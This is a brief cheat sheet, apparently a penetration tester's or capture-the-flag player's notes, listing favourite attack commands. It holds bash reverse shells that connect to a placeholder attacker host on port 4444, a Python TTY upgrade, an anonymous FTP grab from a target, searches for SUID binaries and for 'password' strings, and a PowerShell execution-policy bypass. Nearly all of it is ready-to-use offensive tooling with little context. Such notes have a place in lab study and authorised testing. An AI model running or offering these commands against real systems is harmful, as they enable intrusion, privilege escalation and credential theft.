### List of most used tools here. 

```
source Public/P2/bin/activate
wget -r ftp://anonymous:anonymous@{{TARGET_IP}}/{{FOLDER}}
```
```
python3 -c 'import pty;pty.spawn("/bin/bash");'
import os;os.system("/bin/bash")
find / -perm -4000 -type f 2>/dev/null
grep -rns "password" . 2>/dev/null 
find . -name "filename.txt" 2>/dev/null 
```
```
sh -c 'bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1'
echo "bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1" | bash
```
```
powershell -ExecutionPolicy Bypass 

Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue | Select-String "your_text_here" 
Get-ChildItem -Recurse -Filter "*filename*" -ErrorAction SilentlyContinue 
```
